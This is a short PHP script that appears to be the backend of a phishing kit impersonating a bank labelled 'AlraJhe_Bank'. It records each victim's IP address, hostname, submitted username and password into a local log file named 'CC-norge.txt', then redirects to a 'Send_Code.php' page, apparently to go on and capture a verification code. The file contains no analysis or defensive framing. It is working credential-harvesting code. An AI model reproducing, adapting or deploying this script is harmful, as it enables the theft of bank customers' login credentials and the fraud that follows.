<?php




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg = "------------------------------------------------------\n";
$bilsmg .= "----------------AlraJhe_Bank----------------\n";
$bilsmg .= "UserName       : ".$_POST['userName']."\n";
$bilsmg .= "Password       : ".$_POST['password']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";


$file = fopen("CC-norge.txt", 'a');
fwrite($file, $bilsmg);

header('Location: ./Send_Code.php');



?>